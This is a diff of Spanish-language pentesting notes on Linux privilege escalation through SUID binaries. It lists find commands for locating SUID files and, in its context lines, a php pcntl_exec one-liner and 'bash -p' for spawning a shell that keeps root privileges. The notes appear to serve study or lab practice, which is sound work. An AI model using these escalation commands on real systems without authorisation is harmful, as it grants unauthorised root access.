@@ -19,10 +19,11 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 * Este tipo de comandos afecta a nivel de sistema a todos los usuarios 
 
 ```bash 
-❯ find / -perm -4000 2>/dev/null                  # Ver que comandos son SUID, los buscamos desde la raiz 
-❯ find / -perm -4000 -ls 2>/dev/null              # Ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
-❯ find / -perm -u=s -type f 2>/dev/null           # Buscar comandos SUID desde la raiz 
-❯ find \-user <username> 2>/dev/null              # Ver que comandos donde el propiertario es username
+❯ find / -perm -4000 2>/dev/null             # Ver que comandos son SUID, los buscamos desde la raiz 
+❯ find / -type f -perm -4000 2>/dev/null 
+❯ find / -perm -4000 -ls 2>/dev/null         # Ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
+❯ find / -perm -u=s -type f 2>/dev/null      # Buscar comandos SUID desde la raiz 
+❯ find \-user <username> 2>/dev/null         # Ver que comandos donde el propiertario es username
 ```
 
 ## Binarios 
@@ -37,7 +38,7 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 ```
 
 ```bash 
--rwsr-xr-x 1 root root /usr/bin/php8.1
+-rwsr-xr-x 1 root root /usr/bin/php8.1 | php7.4
 
 ❯ php -r "pcntl_exec('/bin/sh', ['-p']);"     # Obtener una consola interactiva
 ❯ bash -p                                     # Obtener la consola bash con privilegios
